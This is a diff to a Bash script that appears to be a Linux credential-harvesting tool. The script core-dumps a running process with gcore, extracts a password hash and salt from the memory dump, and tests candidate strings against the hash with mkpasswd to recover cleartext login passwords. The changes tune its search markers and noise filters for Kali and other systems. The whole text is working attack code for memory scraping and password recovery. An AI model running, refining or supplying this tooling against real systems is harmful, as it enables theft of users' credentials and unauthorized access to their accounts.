@@ -19,7 +19,7 @@ if [[ `uname -a | awk '{print tolower($0)}'` == *"kali"* ]]; then
 	gcore -o /tmp/dump $PID >& /dev/null
 	HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
 	SALT="$(echo $HASH | cut -d'$' -f 3)"
-	DUMP="$(strings "/tmp/dump.${PID}" | egrep '^gkr_system_authtok$' -B 5 -A 5)"
+	DUMP="$(strings "/tmp/dump.${PID}" | egrep '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
 fi
 
 #If Ubuntu
@@ -46,13 +46,19 @@ while read -r line; do
 		echo "$line,LOW"
 	elif [[ $line =~ ^LOGNAME= ]]; then
 		echo "$line,LOW"
-	elif [[ $line =~ ^UTF\-8 ]]; then
+	elif [[ $line =~ UTF\-8 ]]; then
 		echo "$line,LOW"
 	elif [[ $line =~ ^splayManager[0-9]$ ]]; then
 		echo "$line,LOW"
 	elif [[ $line =~ ^gkr_system_authtok$ ]]; then
 		echo "$line,LOW"
 	elif [[ $line =~ [0-9]{1,4}:[0-9]{1,4}: ]]; then
+		echo "$line,LOW"
+	elif [[ $line =~ Manager\.Worker ]]; then
+		echo "$line,LOW"
+	elif [[ $line =~ \/usr\/share ]]; then
+		echo "$line,LOW"
+	elif [[ $line =~ \/bin ]]; then
 		echo "$line,LOW"
 	elif [[ `mkpasswd -m "sha-512" -S $SALT -s <<< $line` == $HASH ]]; then
 		echo "$line,HIGH"
